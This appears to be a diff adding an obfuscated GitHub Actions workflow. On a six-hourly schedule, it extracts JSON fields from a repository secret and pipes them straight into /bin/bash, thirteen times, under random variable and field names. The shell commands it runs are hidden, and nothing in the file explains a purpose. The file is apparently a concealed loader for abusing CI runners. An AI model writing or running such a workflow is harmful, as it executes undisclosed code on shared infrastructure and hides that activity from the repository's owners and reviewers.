@@ -1,0 +1,28 @@
+name: mingrixiu2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingrixiu2345
+        env:
+          r8898: ${{ secrets.r8898 }}
+        run: |
+          echo $r8898 | jq -r .gb73 | /bin/bash
+          echo $mjow371 | jq -r .tm2 | /bin/bash
+          echo $trwjj310 | jq -r .iks259 | /bin/bash
+          echo $ri02 | jq -r .rf5 | /bin/bash
+          echo $afn21922 | jq -r .oespo68958 | /bin/bash
+          echo $elk01 | jq -r .t311 | /bin/bash
+          echo $b245 | jq -r .ehj28 | /bin/bash
+          echo $j1539 | jq -r .txey596 | /bin/bash
+          echo $pfoi9408 | jq -r .x55911 | /bin/bash
+          echo $a283 | jq -r .tsw6140 | /bin/bash
+          echo $f77006 | jq -r .kkvs4164 | /bin/bash
+          echo $fpmjc512 | jq -r .ay78698 | /bin/bash
+          echo $q6 | jq -r .cx18 | /bin/bash
+
